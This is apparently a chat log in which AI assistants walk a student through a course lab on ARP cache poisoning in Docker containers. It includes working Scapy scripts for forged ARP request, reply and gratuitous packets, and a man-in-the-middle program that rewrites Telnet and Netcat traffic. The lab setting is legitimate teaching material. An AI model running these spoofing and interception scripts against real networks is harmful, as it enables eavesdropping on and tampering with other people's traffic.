### Assistant (gpt-o3-mini)

Below is a step‐by‐step guide to help you complete the lab. Make sure to read the lab PDF and any additional materials provided by your instructor, as the following instructions highlight the overall flow and key points you need to address.

---

## 1. Prepare the Lab Environment

1. **Obtain the Lab Setup Files**  
   Download the “ARP Cache Poisoning Attack Lab” setup files provided by your instructor. Use these files rather than any outdated version.

2. **Configure Your Environment**  
   • You should have three hosts configured:  
   - **Host A:** Victim  
   - **Host B:** Target (victim of poisoning)  
   - **Host M:** Your machine/attacker  
   
   • Ensure that you can run Wireshark on your host M and select the correct network interface (the one named `br-####`, unique to your environment). Using any other interface might alter the packet details.

3. **Fill in the `settings.txt` File**
   - Create a file named `settings.txt` with the following template:
     ```
     IP_A=
     MAC_A=
     IP_B=
     MAC_B=
     MAC_M=
     payload=
     ```
   - Populate it with the IP and MAC addresses for Host A, B, and M (as provided in your lab environment).  
   - In the `payload` field, enter your student id.  
   - **Example:**
     ```
     IP_A=10.9.2.2
     MAC_A=02:93:0a:09:67:05
     IP_B=10.9.1.15
     MAC_B=02:42:0a:09:00:06
     MAC_M=02:93:0a:09:00:69
     payload=js1556
     ```

---

## 2. Task 1: ARP Cache Poisoning

You will need to generate three different kinds of ARP packets to poison Host A’s ARP cache.

### Task 1.A – ARP Request Attack

1. **Objective:**  
   On Host M, construct an ARP request packet directed to Host A that will attempt to poison the cache so that Host A maps B’s IP to M’s MAC.

2. **Steps:**  
   - Use a tool like Scapy to create a custom ARP request.  
   - Set the packet fields so that the source IP is B’s IP but the source MAC is M’s MAC.  
   - Send the ARP request from Host M to Host A.
   - On Host A, check the ARP cache (for example, using `arp -a` on a Linux shell) to see if the entry for B’s IP now shows M’s MAC.

3. **Wireshark:**  
   Start a capture on the appropriate interface (br-####) so that you capture the packet sent for this attack. Save the capture later as part of your submission.

### Task 1.B – ARP Reply Attack

1. **Objective:**  
   Use an ARP reply packet from Host M to claim the IP address of Host B while advertising M’s MAC. You will try this attack under two scenarios:
   - **Scenario 1:** B’s IP is already cached on Host A.
   - **Scenario 2:** B’s IP is not present in A’s cache.

2. **Steps:**  
   - Write a script (or use Scapy interactively) on Host M that generates an ARP reply packet.  
   - Craft the ARP reply such that the sender IP is B’s IP and the sender MAC is M’s MAC.  
   - To test **Scenario 1**, first make sure that Host A has already learned B’s correct MAC (for example, by letting A ping B initially). Then send the malicious ARP reply and check if the ARP cache is updated with M’s MAC.  
   - For **Scenario 2**, clear Host A’s ARP cache (or use a host reboot) so B’s IP is not present, then send the ARP reply from Host M and observe the change.

3. **Wireshark:**  
   Capture both scenarios so you have evidence of the behavior change.

### Task 1.C – Gratuitous ARP Request Attack

1. **Objective:**  
   Construct a gratuitous ARP packet on Host M. In this special packet:
   - **Source IP and destination IP are the same** (both are B’s IP).
   - The destination MAC in both the ARP and Ethernet headers is the broadcast address (`ff:ff:ff:ff:ff:ff`).
   - No reply is expected.

2. **Steps:**  
   - Create the packet (again, a task suited for Scapy) with the appropriate fields:
     - `arp.psrc = B’s IP`
     - `arp.pdst = B’s IP`
     - Set the destination MAC to broadcast.  
   - Send this packet and check Host A’s ARP cache to see if it now maps B’s IP to M’s MAC.
   - Test under the same two scenarios as in Task 1.B (i.e., when B’s IP is present and when it is absent in Host A’s cache).

3. **Wireshark:**  
   Include these packets in your capture file.

---

## 3. Task 2: MITM Attack on Telnet

In this part you will intercept a Telnet session between Host A (client) and Host B (server) and modify the data in transit.

### Preparation

1. **ARP Cache Poisoning:**  
   Make sure you have established the ARP poisoning between Host A and Host B so that their communication flows through Host M.

2. **IP Forwarding:**  
   - Initially, disable IP forwarding on Host M to validate that the attack is visible:
     ```
     sysctl net.ipv4.ip_forward=0
     ```
   - Test connectivity (for example, use `ping` between A and B).
   - Once verified, enable IP forwarding to allow the Telnet session to function normally:
     ```
     sysctl net.ipv4.ip_forward=1
     ```

### Implementing the Sniff-and-Spoof Program

1. **Objective:**  
   Write a Python script (using Scapy) that:
   - Intercepts TCP packets on the Telnet session.
   - For packets from Host A to Host B, modifies the content by replacing every instance of the character `"Q"` with `"Z"`.
   - For packets from Host B to Host A, simply forwards the packet unchanged.

2. **Steps:**  
   - Start with the provided skeleton:
     ```python
     from scapy.all import *
     
     IP_A = "10.9.0.X"  # update with your actual IP for A
     MAC_A = "xx:xx:xx:xx:xx:xx"  # update with A’s MAC
     IP_B = "10.9.0.Y"  # update with your actual IP for B
     MAC_B = "xx:xx:xx:xx:xx:xx"  # update with B’s MAC
     
     def spoof_pkt(pkt):
         if IP in pkt and pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
             # Make a copy of the packet and prepare it for modification.
             newpkt = IP(bytes(pkt[IP]))
             del(newpkt.chksum)
             del(newpkt[TCP].chksum)
             if pkt[TCP].payload:
                 data = pkt[TCP].payload.load
                 # Replace 'Q' with 'Z' (ensure you handle single character scenarios)
                 newdata = data.replace(b"Q", b"Z")
                 send(newpkt / newdata)
             else:
                 send(newpkt)
         elif IP in pkt and pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
             newpkt = IP(bytes(pkt[IP]))
             del(newpkt.chksum)
             del(newpkt[TCP].chksum)
             send(newpkt)
     
     # Adjust the filter so you do not capture your own spoofed traffic.
     pkt = sniff(
         iface="br-####", filter="tcp and port 23", prn=spoof_pkt, store=0
     )
     ```
   - **Important:** Change the interface (`iface`) to your br-#### interface and adjust IP and MAC values accordingly.
   - Make sure your filter excludes packets generated by your own spoofing (you might need to include an expression like `and not src host <Host M IP>`).

3. **Validation:**  
   - On Host A, open a Telnet session to Host B.  
   - Type a single `'Q'` (or a sequence containing `'Q'`) in the Telnet window.  
   - If your interception works, you should see that what appears on the Telnet window is a `'Z'` instead.
   - **Wireshark:** Ensure your capture contains:  
     - A packet from A→M with a payload containing `'Q'`.  
     - A modified packet from M→B with a payload changed to `'Z'`.  
     - Similarly, verify the return packets from B→M and then to A carry the same modification.

---

## 4. Task 3: MITM Attack on Netcat

In this task the setup is nearly the same as Task 2 except you are now intercepting a Netcat session where your student id appears in the transmitted data. Your job is to replace every occurrence of your student id with a sequence of lowercase `'a'` characters (the count must match the length of your student id).

### Setup the Netcat Connection

1. **Start the Server on Host B:**  
   Run:
   ```bash
   nc -lp 9090
   ```
2. **Start the Client on Host A:**  
   Run:
   ```bash
   nc 10.9.0.<B_IP_last_octet> 9090
   ```

### Implementing the Spoofing for Netcat

1. **Objective:**  
   Intercept each TCP packet coming from Host A (carrying your student id in the payload) and replace the student id with a string of `'a'` characters of equivalent length.

2. **Steps:**  
   - Reuse the basic structure of your Sniff-and-Spoof program from Task 2.
   - In the section for packets from A to B, add logic similar to:
     ```python
     # Suppose your student id is "js12345"
     student_id = b"js12345"
     replacement = b"a" * len(student_id)
     
     if student_id in data:
         newdata = data.replace(student_id, replacement)
     else:
         newdata = data
     ```
   - Ensure you delete the checksum fields (both IP and TCP) so that Scapy recalculates them.
   - Maintain the original TCP sequence numbers by only modifying the payload and not altering the length (hence, replacement must be exactly the same length).

3. **Wireshark Capture:**  
   Capture packets showing:
   - A packet from A→M containing your student id.
   - A spoofed packet from M→B where the student id has been replaced with a string of lowercase `'a'` characters.
   - Also capture the corresponding packets from B→M and M→A.

---

## 5. Finalizing and Submitting Your Work

1. **Wireshark Capture:**  
   Make sure your capture file includes the packets from all tasks:
   - All ARP poisoning packets (Task 1.A, 1.B, 1.C).
   - Telnet MITM modifying the character from `'Q'` to `'Z'` (Task 2).
   - Netcat MITM replacing your student id with `'a'` characters (Task 3).

2. **Save the Capture Correctly:**  
   Save your Wireshark capture as a `.pcap` file (e.g., `netID.pcap` where `netID` is your student id). **Do not save as “pcapng”.**

3. **Submit the Files:**  
   Submit both the `.pcap` file and your `settings.txt` file through Gradescope to the appropriate Lab 3 submission assignment.

---

By following these steps, you should be able to:

- Craft custom ARP packets to poison the ARP cache on Host A.
- Implement a MITM attack that intercepts and modifies Telnet and Netcat sessions.
- Capture evidence of your work via Wireshark.

Take your time to test each step separately before integrating all parts. Happy hacking (ethically)!

### Assistant (gpt-o3-mini)

You can determine the IP and MAC addresses of your containers (Hosts A, B, and M) using one of the following methods:

---

## Method 1: Using `docker inspect`

The `docker inspect` command can show detailed networking information for a container. For example, to display the IP and MAC addresses for a container with ID `fc50e4e36736` (which corresponds to Host A):

```bash
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}} {{.MacAddress}}{{end}}' fc50e4e36736
```

This command formats the output to show the IP address followed by the MAC address. Repeat this command for each container ID (for Host B and Host M) as needed.

---

## Method 2: Logging into the Container

1. **Log into the container:**

   For Host A, run:
   ```bash
   docker exec -it fc50e4e36736 bash
   ```

2. **Check the network interface:**

   Once inside the container, you can use either of the following commands:

   - With `ifconfig` (if installed):
     ```bash
     ifconfig eth0
     ```
     
   - Or with `ip addr`:
     ```bash
     ip addr show eth0
     ```

   In the output, look for a line similar to:
   ```
   link/ether 02:42:0a:09:00:05  brd ff:ff:ff:ff:ff:ff
   ```
   Here, the `02:42:0a:09:00:05` is the MAC address for the `eth0` interface. The IP address is usually displayed at the top of the interface block.

3. **Repeat for Each Host:**

   - For Host B (container ID `51a2027240d3`, IP `10.9.0.6`), run:
     ```bash
     docker exec -it 51a2027240d3 bash
     ip addr show eth0
     ```
     
   - For Host M (container ID `7a593a72b7d6`, IP `10.9.0.105`), run:
     ```bash
     docker exec -it 7a593a72b7d6 bash
     ip addr show eth0
     ```

---

## Summary

- **IP addresses:**  
  These are usually provided by the lab environment and are visible in your `dockps` output:
  - Host A: `10.9.0.5`
  - Host B: `10.9.0.6`
  - Host M: `10.9.0.105`

- **MAC addresses:**  
  Use either the `docker inspect` command or log into each container and check the network interface (typically `eth0`) with `ifconfig` or `ip addr show` to determine the MAC address (e.g., something like `02:42:0a:09:00:05`).

Once you have these values, you can fill out your `settings.txt` file for the lab.


---

### User

settings file should be in M right? (the attacker)


---

### Assistant (gpt-o3-mini)

The `settings.txt` file is not something that "lives" exclusively on Host M; rather, it should contain the information for all three hosts (A, B, and M). However, since you are performing the attack from Host M (the attacker), you will most likely be creating and editing this file on Host M. 

The file should include the following details:

- IP and MAC for Host A (target)
- IP and MAC for Host B (another target)
- MAC for Host M (your attacker machine)
- Your student id in the payload field

For example, if your values are as follows:

- Host A: IP `10.9.0.5` and MAC `02:42:0a:09:00:05`
- Host B: IP `10.9.0.6` and MAC `02:42:0a:09:00:06`
- Host M: MAC `02:42:0a:09:00:69` (and IP is noted in your lab output)
- Your payload: `js1556`

Then your `settings.txt` should look like:

```
IP_A=10.9.0.5
MAC_A=02:42:0a:09:00:05
IP_B=10.9.0.6
MAC_B=02:42:0a:09:00:06
MAC_M=02:42:0a:09:00:69
payload=js1556
```

You create and submit this file along with your `.pcap` file regardless of where you stored it during the lab. Just ensure that the MAC of Host M (the attacker) is correctly populated in the file.

### Assistant (gpt-o3-mini)

Based on your output, your `settings.txt` file should look like this:

```
IP_A=10.9.0.5
MAC_A=02:42:0a:09:00:05
IP_B=10.9.0.6
MAC_B=02:42:0a:09:00:06
MAC_M=02:42:0a:09:00:69
payload=your_student_id
```

Replace `your_student_id` with your actual student ID (or your netID) as instructed.

### Assistant (gemini-2.5-pro)

Okay, let's tackle Task 1.A step-by-step.

**Goal:** Poison Host A's ARP cache so that it incorrectly maps Host B's IP address (`10.9.0.6`) to Host M's MAC address (`02:42:0a:09:00:69`). We will do this by sending a specially crafted ARP *request* packet from Host M to Host A.

**Steps:**

1.  **Log into Host M:**
    ```bash
    docker exec -it 7a593a72b7d6 bash
    ```
    *(Remember, `7a593a72b7d6` is the container ID for Host M)*

2.  **Create the Python Script (on Host M):**
    Create a file named `task1a.py` (you can use `nano task1a.py` or `vim task1a.py`) and paste the following code into it:

    ```python
    #!/usr/bin/env python3

    from scapy.all import Ether, ARP, sendp

    # Define the IP and MAC addresses based on your settings.txt
    IP_A = "10.9.0.5"
    MAC_A = "02:42:0a:09:00:05"
    IP_B = "10.9.0.6"
    # MAC_B is not strictly needed for this packet but good practice
    MAC_B = "02:42:0a:09:00:06"
    MAC_M = "02:42:0a:09:00:69" # Attacker's MAC

    print("--- Sending Malicious ARP Request ---")
    print(f"Spoofing ARP Request: {IP_B} is at {MAC_M}")
    print(f"Targeting Host A ({IP_A}) at MAC {MAC_A}")

    # Construct the Ethernet frame
    # Source MAC is the attacker's MAC (MAC_M)
    # Destination MAC is Host A's MAC (MAC_A)
    ether = Ether(src=MAC_M, dst=MAC_A)

    # Construct the ARP packet
    # op=1 signifies an ARP Request
    # hwsrc = Sender MAC -> Attacker's MAC (MAC_M)
    # psrc  = Sender IP  -> IP we want to impersonate (IP_B)
    # hwdst = Target MAC -> Ignored in request (00:00:00:00:00:00)
    # pdst  = Target IP  -> IP address being queried (IP_A)
    arp = ARP(op=1, hwsrc=MAC_M, psrc=IP_B, hwdst="00:00:00:00:00:00", pdst=IP_A)

    # Combine Ethernet and ARP layers
    packet = ether/arp

    # Send the packet at Layer 2
    # Use the correct interface name inside the container (usually eth0)
    sendp(packet, iface="eth0", verbose=False)

    print("Packet sent.")
    print("------------------------------------")
    ```

3.  **Start Wireshark Capture (on Host M):**
    *   Open Wireshark on your main machine (where Docker is running).
    *   Start a capture. **Crucially, select the correct interface.** This should be the bridge interface associated with your Docker network, likely named `br-xxxx` (where xxxx is specific to your setup). **Do NOT select "any" or a physical interface like "eth0" or "wlan0" on your host machine.**
    *   You can use a display filter `arp` to make it easier to see the relevant packets.

4.  **Run the Script (on Host M):**
    Execute the script using `sudo` (needed for raw packet sending):
    ```bash
    sudo python3 task1a.py
    ```
    You should see the output confirming the packet was sent.

5.  **Check Host A's ARP Cache:**
    *   Open another terminal and log into Host A:
        ```bash
        docker exec -it fc50e4e36736 bash
        ```
        *(Remember, `fc50e4e36736` is the container ID for Host A)*
    *   Display the ARP cache:
        ```bash
        arp -n
        ```
    *   **Verify:** Look for the entry corresponding to Host B's IP address (`10.9.0.6`). The MAC address listed next to it should now be Host M's MAC address (`02:42:0a:09:00:69`). It should look similar to the "Victim" window in the example image provided in the lab description (though the IPs/MACs will match yours).

6.  **Stop Wireshark Capture:**
    *   Go back to Wireshark and stop the capture.
    *   Examine the captured packet. You should see an ARP Request packet:
        *   Source MAC: `02:42:0a:09:00:69` (MAC_M)
        *   Destination MAC: `02:42:0a:09:00:05` (MAC_A)
        *   ARP Sender MAC: `02:42:0a:09:00:69` (MAC_M)
        *   ARP Sender IP: `10.9.0.6` (IP_B)
        *   ARP Target MAC: `00:00:00:00:00:00`
        *   ARP Target IP: `10.9.0.5` (IP_A)
    *   **Save the capture:** Go to `File -> Save As...`. Name the file `your_netid.pcap` (e.g., `js12345.pcap`). **Make sure the file type is `Wireshark/tcpdump/... - pcap` and NOT `pcapng`**.

You have now completed Task 1.A. Keep the Wireshark capture running (or start a new one) if you are immediately proceeding to Task 1.B, as you need to capture packets for all tasks in one file.

### User

this worked,let's move to part 2: Q1.2 Task 1.B (using ARP reply)
0 Points
Grading comment:

On host M, construct an ARP reply packet and send to host A. Check A’s ARP cache, and see whether M’s MAC address is mapped to B’s IP address. Try the attack for two different scenarios:

    Scenario 1: B’s IP is already in A’s cache.
    Scenario 2: B’s IP is not in A’s cache.

Sample Screenshots - Scenario 1:

Screen_Shot_2022-04-07_at_5.47.37_PM.png

Sample Screenshots - Scenario 2:

### Assistant (gemini-2.5-pro)

Excellent, Task 1.A was successful! Now let's move on to Task 1.B, using an ARP *reply* packet.

**Goal:** Poison Host A's ARP cache using a crafted ARP reply sent from Host M, again mapping B's IP (`10.9.0.6`) to M's MAC (`02:42:0a:09:00:69`). We need to test this under two conditions.

**Steps:**

1.  **Create the Python Script (on Host M):**
    Create a file named `task1b.py` on Host M:
    ```python
    #!/usr/bin/env python3

    from scapy.all import Ether, ARP, sendp

    # Define the IP and MAC addresses based on your settings.txt
    IP_A = "10.9.0.5"
    MAC_A = "02:42:0a:09:00:05"
    IP_B = "10.9.0.6"
    MAC_M = "02:42:0a:09:00:69" # Attacker's MAC

    print("--- Sending Malicious ARP Reply ---")
    print(f"Spoofing ARP Reply: {IP_B} is at {MAC_M}")
    print(f"Targeting Host A ({IP_A}) at MAC {MAC_A}")

    # Construct the Ethernet frame
    # Source MAC is the attacker's MAC (MAC_M)
    # Destination MAC is Host A's MAC (MAC_A)
    ether = Ether(src=MAC_M, dst=MAC_A)

    # Construct the ARP packet
    # op=2 signifies an ARP Reply
    # hwsrc = Sender MAC -> Attacker's MAC (MAC_M)
    # psrc  = Sender IP  -> IP we want to impersonate (IP_B)
    # hwdst = Target MAC -> Victim's MAC (MAC_A)
    # pdst  = Target IP  -> Victim's IP (IP_A)
    arp = ARP(op=2, hwsrc=MAC_M, psrc=IP_B, hwdst=MAC_A, pdst=IP_A)

    # Combine Ethernet and ARP layers
    packet = ether/arp

    # Send the packet at Layer 2
    sendp(packet, iface="eth0", verbose=False)

    print("Packet sent.")
    print("------------------------------------")
    ```

2.  **Ensure Wireshark is Capturing:**
    Make sure your Wireshark capture is still running on the correct `br-xxxx` interface. If you stopped it, start a new capture (you'll append the packets). Remember the `arp` filter can be helpful.

3.  **Scenario 1: B's IP is already in A's cache**
    *   **Establish Cache Entry (on Host A):** Log into Host A (`docker exec -it fc50e4e36736 bash`) and ping Host B once to make sure A learns B's *correct* MAC address:
        ```bash
        ping -c 1 10.9.0.6
        ```
    *   **Verify Cache (on Host A):** Check the ARP cache. You should see the correct mapping for `10.9.0.6` to `02:42:0a:09:00:06`.
        ```bash
        arp -n
        ```
    *   **Run the Attack Script (on Host M):** Execute the reply script:
        ```bash
        sudo python3 task1b.py
        ```
    *   **Check Cache Again (on Host A):** Re-run `arp -n` on Host A. Observe if the MAC address associated with `10.9.0.6` has changed to M's MAC (`02:42:0a:09:00:69`).

4.  **Scenario 2: B's IP is not in A's cache**
    *   **Clear Cache Entry (on Host A):** Delete the specific ARP entry for Host B:
        ```bash
        arp -d 10.9.0.6
        ```
    *   **Verify Cache is Clear (on Host A):** Run `arp -n` again. The entry for `10.9.0.6` should be gone.
    *   **Run the Attack Script (on Host M):** Execute the reply script again:
        ```bash
        sudo python3 task1b.py
        ```
    *   **Check Cache Again (on Host A):** Run `arp -n` one more time. See if an entry for `10.9.0.6` has been created and if it maps to M's MAC (`02:42:0a:09:00:69`).

5.  **Observe and Capture:**
    *   Make sure Wireshark captured the ARP reply packets you sent in both scenarios.
    *   Think about the question: *Which scenario works, and which does not?* (You don't need to submit the answer, but understand *why* based on how ARP caches typically handle unsolicited replies).

Continue capturing packets for Task 1.C, or stop and save your `.pcap` file if you need a break, ensuring you save in the correct `pcap` format.

### User

Am I confused, or is the only thing that needs to be submitted is the pcap from task 2 (MITM attack)? What do I need to submit? Are the multiple files I need to send?

[pasted-1.txt](https://utfs.io/f/IN4OjmY4wMHBIlQcQNY4wMHBOPs0NvxVQ3nyUXgikbCfpurT)

---

### Assistant (gemini-2.5-pro)

Okay, let's clarify the submission requirements based on the instructions you provided. You are *not* confused, but the instructions emphasize capturing everything together.

Here's what you need to submit:

1.  **One `netID.pcap` file:**
    *   This single `.pcap` file **must contain the captured packets for ALL the tasks** described in the lab (Task 1.A, 1.B, 1.C, Task 2, and Task 3).
    *   You should start your Wireshark capture *before* you begin Task 1.A, keep it running while you perform all the steps for Task 1, Task 2, and Task 3, and then stop the capture and save it *once* at the very end.
    *   The file must be named using your student ID (e.g., `js12345.pcap`).
    *   Crucially, it must be saved in the `.pcap` format, **not** the default `.pcapng` format.
    *   Make sure you capture on the correct `br-####` interface in Wireshark.

2.  **One `settings.txt` file:**
    *   This file contains the IP and MAC addresses for Hosts A, B, and M, plus your student ID as the payload, formatted exactly as shown in the instructions.

**In summary:** You need to submit **two files**:

*   `your_netid.pcap` (containing packets from Tasks 1A, 1B, 1C, 2, and 3)
*   `settings.txt`

So, while Task 2 (MITM on Telnet) and Task 3 (MITM on Netcat) are significant parts, the `.pcap` file needs the evidence from the initial ARP poisoning steps (Task 1) as well.

### User

For point 5 of the previous question, the second step does not modify the arp cache, is this because we deleted it before? And is this expected?


---

### Assistant (gemini-2.5-pro)

Yes, your observation is correct, and **this is often the expected behavior** for Scenario 2 in Task 1.B.

Here's why:

1.  **Unsolicited ARP Replies:** An ARP reply sent without a prior ARP request from the recipient is called an "unsolicited ARP reply."
2.  **Security Measure:** Many modern operating systems (including the Linux distributions typically used in these labs) have security mechanisms to **ignore or drop unsolicited ARP replies** as a defense against ARP cache poisoning.
3.  **Scenario 1 (Cache Populated):** When B's IP was already in A's cache (even if it was the *correct* MAC initially), Host A has some "context" for that IP address. Receiving an ARP reply related to that IP might be treated as an update, and the system might accept it, overwriting the existing entry. This is why Scenario 1 likely worked.
4.  **Scenario 2 (Cache Empty):** When you deleted the entry for B's IP (`arp -d 10.9.0.6`), Host A had no existing entry and hadn't recently requested information about `10.9.0.6`. When the malicious ARP reply arrived from Host M claiming to be `10.9.0.6`, Host A treated it as completely unsolicited and likely ignored it due to its security settings. Therefore, no new entry was created in the cache.

**Conclusion:** It's expected that the ARP reply attack might fail to *create* a new entry in the cache (Scenario 2) but might succeed in *updating* an existing one (Scenario 1). This highlights why different ARP poisoning techniques exist and why attackers might choose one over the other depending on the situation. ARP requests (like in Task 1.A) are often more effective at injecting completely new, false entries.

ok let's move to 1.3 Q1.3 Task 1C (using ARP gratuitous request message)
0 Points
Grading comment:

On host M, construct an ARP gratuitous request packet, and use it to map M’s MAC address to B’s IP address. Please launch the attack under the same two scenarios as those described in Task 1.B.

ARP gratuitous packet is a special ARP request packet. It is used when a host machine needs to update outdated information on all the other machine’s ARP cache. The gratuitous ARP packet has the following characteristics:

    The source and destination IP addresses are the same, and they are the IP address of the host issuing the gratuitous ARP.
    The destination MAC addresses in both ARP header and Ethernet header are the broadcast MAC address (ff:ff:ff:ff:ff:ff).
    No reply is expected.

Question: Which scenario works, and which does not? Answer for yourself, answer is not collected.

Submission: Capture this attack on Wireshark (along with the previous attacks) and submit it on Gradescope.

### Assistant (gemini-2.5-pro)

Okay, let's proceed with Task 1.C, using a Gratuitous ARP request.

**Goal:** Poison Host A's ARP cache using a specially crafted gratuitous ARP request sent from Host M. The objective remains to map B's IP (`10.9.0.6`) to M's MAC (`02:42:0a:09:00:69`). We'll test this under the same two conditions as Task 1.B.

**Key Characteristics of Gratuitous ARP (as per lab description):**

*   It's an ARP Request (`op=1`).
*   Source IP (`psrc`) and Target IP (`pdst`) in the ARP layer are the *same* - the IP address being announced (in our case, `IP_B`).
*   The destination MAC address in *both* the Ethernet header (`ether.dst`) and the ARP header (`arp.hwdst`) is the broadcast MAC (`ff:ff:ff:ff:ff:ff`).
*   The source MAC in both Ethernet (`ether.src`) and ARP (`arp.hwsrc`) is the MAC of the sender (in our case, `MAC_M`).

**Steps:**

1.  **Create the Python Script (on Host M):**
    Create a file named `task1c.py` on Host M:
    ```python
    #!/usr/bin/env python3

    from scapy.all import Ether, ARP, sendp

    # Define the IP and MAC addresses based on your settings.txt
    IP_B = "10.9.0.6"          # The IP address we are claiming
    MAC_M = "02:42:0a:09:00:69" # Attacker's MAC address
    BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"

    print("--- Sending Malicious Gratuitous ARP Request ---")
    print(f"Announcing that {IP_B} is at {MAC_M} via Gratuitous ARP")

    # Construct the Ethernet frame
    # Source MAC is the attacker's MAC (MAC_M)
    # Destination MAC is Broadcast
    ether = Ether(src=MAC_M, dst=BROADCAST_MAC)

    # Construct the ARP packet
    # op=1 signifies an ARP Request
    # hwsrc = Sender MAC -> Attacker's MAC (MAC_M)
    # psrc  = Sender IP  -> IP we want to impersonate/claim (IP_B)
    # hwdst = Target MAC -> Broadcast MAC (as per gratuitous ARP spec in lab)
    # pdst  = Target IP  -> IP we want to impersonate/claim (IP_B - same as psrc)
    arp = ARP(op=1, hwsrc=MAC_M, psrc=IP_B, hwdst=BROADCAST_MAC, pdst=IP_B)

    # Combine Ethernet and ARP layers
    packet = ether/arp

    # Send the packet at Layer 2
    sendp(packet, iface="eth0", verbose=False)

    print("Packet sent.")
    print("------------------------------------")
    ```

2.  **Ensure Wireshark is Capturing:**
    Keep your Wireshark capture running on the `br-xxxx` interface. Use the `arp` filter if desired.

3.  **Scenario 1: B's IP is already in A's cache**
    *   **Establish Cache Entry (on Host A):** Log into Host A (`docker exec -it fc50e4e36736 bash`) and ensure the correct entry exists:
        ```bash
        ping -c 1 10.9.0.6
        arp -n # Verify 10.9.0.6 maps to 02:42:0a:09:00:06
        ```
    *   **Run the Attack Script (on Host M):** Execute the gratuitous ARP script:
        ```bash
        sudo python3 task1c.py
        ```
    *   **Check Cache Again (on Host A):** Re-run `arp -n` on Host A. Observe if the MAC address associated with `10.9.0.6` has changed to M's MAC (`02:42:0a:09:00:69`).

4.  **Scenario 2: B's IP is not in A's cache**
    *   **Clear Cache Entry (on Host A):** Delete the specific ARP entry for Host B:
        ```bash
        arp -d 10.9.0.6
        arp -n # Verify 10.9.0.6 entry is gone
        ```
    *   **Run the Attack Script (on Host M):** Execute the gratuitous ARP script again:
        ```bash
        sudo python3 task1c.py
        ```
    *   **Check Cache Again (on Host A):** Run `arp -n` one more time. See if an entry for `10.9.0.6` has been created and if it maps to M's MAC (`02:42:0a:09:00:69`).

5.  **Observe and Capture:**
    *   Make sure Wireshark captured the gratuitous ARP request packets you sent in both scenarios. Note their structure (broadcast destination, identical source/target IPs in the ARP layer).
    *   Again, consider the question: *Which scenario works, and which does not?* How does the system treat this type of ARP packet compared to the standard reply? (Gratuitous ARPs are often accepted more readily as they are intended for updates).

This completes Task 1. Now you should have packets for 1.A, 1.B (both scenarios), and 1.C (both scenarios) in your Wireshark capture. We can now move on to Task 2. Remember to keep the capture running.


---

### User

should scenario B not work here either? But A should?


---

### Assistant (gemini-2.5-pro)

You've got the right intuition comparing it to Task 1.B, but the behavior with Gratuitous ARP is often different. Here's the breakdown:

1.  **Scenario 1 (Cache Populated):** Yes, this scenario **should work**. When Host A already has an entry for `10.9.0.6`, receiving a Gratuitous ARP packet announcing that `10.9.0.6` is now at `MAC_M` is precisely what Gratuitous ARP is designed for (updating existing information). Host A should update its cache with the new (poisoned) information.

2.  **Scenario 2 (Cache Empty):** Unlike the unsolicited ARP *reply* in Task 1.B, a Gratuitous ARP *request* (even though it's not really requesting anything) is often **accepted and cached** by operating systems, even if there's no prior entry.
    *   **Why?** Gratuitous ARP's legitimate purpose is for a host to announce its presence or IP change to *everyone* on the network segment (hence the broadcast). Systems often listen for these announcements and update their caches proactively. They don't necessarily treat it with the same suspicion as an unsolicited *reply* directed specifically at them.

**Therefore, it's expected that for Task 1.C (Gratuitous ARP), *both* Scenario 1 and Scenario 2 should successfully poison Host A's ARP cache.**

This makes Gratuitous ARP a potentially more effective poisoning technique in some situations because it can often both *create* new poisoned entries and *update* existing ones.


---

### User

the gratiutous arp is not working, A's cache is still blank for 10.9.0.6


---

### Assistant (gemini-2.5-pro)

Okay, that's unexpected based on the typical behavior of Gratuitous ARP. Let's troubleshoot why Host A's cache might remain blank for `10.9.0.6` after you send the Gratuitous ARP from Host M in Scenario 2.

Here are a few things to check:

1.  **Wireshark Verification (Most Important):**
    *   Are you absolutely sure the Gratuitous ARP packet *is being sent* and *appears* in your Wireshark capture on the `br-xxxx` interface?
    *   If it *is* in Wireshark, examine its details carefully:
        *   **Ethernet Dest:** Is it `ff:ff:ff:ff:ff:ff`?
        *   **Ethernet Src:** Is it `02:42:0a:09:00:69` (MAC_M)?
        *   **ARP Opcode:** Is it `request (1)`?
        *   **ARP Sender MAC:** Is it `02:42:0a:09:00:69` (MAC_M)?
        *   **ARP Sender IP:** Is it `10.9.0.6` (IP_B)?
        *   **ARP Target MAC:** Is it `ff:ff:ff:ff:ff:ff` (Broadcast)?
        *   **ARP Target IP:** Is it `10.9.0.6` (IP_B)?
    *   If the packet looks correct in Wireshark, it means Host M sent it onto the network segment correctly. The issue lies in how Host A is processing it.
    *   If the packet *is not* in Wireshark, double-check:
        *   You're running the script with `sudo python3 task1c.py`.
        *   The interface name in `sendp(..., iface="eth0", ...)` is correct for *inside the Host M container*. (Run `ip a` inside Host M to confirm its interface is `eth0`).
        *   You are capturing on the correct `br-xxxx` interface in Wireshark on your host machine.

2.  **Cache Clearing Confirmation:**
    *   Before running `task1c.py` for Scenario 2, run `arp -n` on Host A *immediately* beforehand to be 100% certain the entry for `10.9.0.6` is gone.
    *   Run `arp -n` on Host A *immediately* after the script finishes on Host M.

3.  **Script Accuracy:**
    *   Just quickly re-verify the IPs and MACs in your `task1c.py` script match your `settings.txt` exactly. A typo could cause it to fail silently.

4.  **Host A ARP Configuration (Less Likely, but Possible):**
    *   Sometimes, Linux kernel settings can influence how ARP is handled. Check the `arp_accept` setting on Host A:
        ```bash
        # Inside Host A container (fc50e4e36736)
        sysctl net.ipv4.conf.eth0.arp_accept
        sysctl net.ipv4.conf.all.arp_accept
        ```
    *   If `arp_accept` is `0`, the interface might not create cache entries from unsolicited/gratuitous ARPs. While usually enabled in lab environments, it's worth checking. If it is 0, you could *temporarily* try setting it to 1 (`sudo sysctl net.ipv4.conf.eth0.arp_accept=1`) and re-running the Scenario 2 test, but this shouldn't typically be necessary for the lab.

**Start with step 1 (Wireshark verification).** That will tell you if the packet is being sent correctly onto the network where Host A can see it. If it is, and Host A is still ignoring it, it points towards Host A's processing or configuration.

root@fc50e4e36736:~#


---

### Assistant (gemini-2.5-pro)

Okay, that `arp_accept = 0` setting is the culprit!

*   **What `arp_accept = 0` means:** This tells the Linux kernel on Host A **not** to create new ARP cache entries based on unsolicited or gratuitous ARP packets it receives. It will generally only create entries in response to its *own* ARP requests or update existing entries based on certain rules (which is why Scenario 1 might have worked, but Scenario 2 failed).
